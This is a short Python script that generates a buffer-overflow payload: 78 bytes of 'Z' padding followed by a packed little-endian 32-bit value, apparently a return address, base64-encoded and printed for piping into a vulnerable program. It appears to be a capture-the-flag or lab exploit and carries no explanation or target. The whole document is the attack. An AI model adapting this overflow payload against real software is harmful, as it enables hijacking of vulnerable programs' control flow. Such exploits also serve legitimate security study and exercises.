
import sys
import struct
import base64

buf = b'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'
buf += struct.pack('<I', 2286432696)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
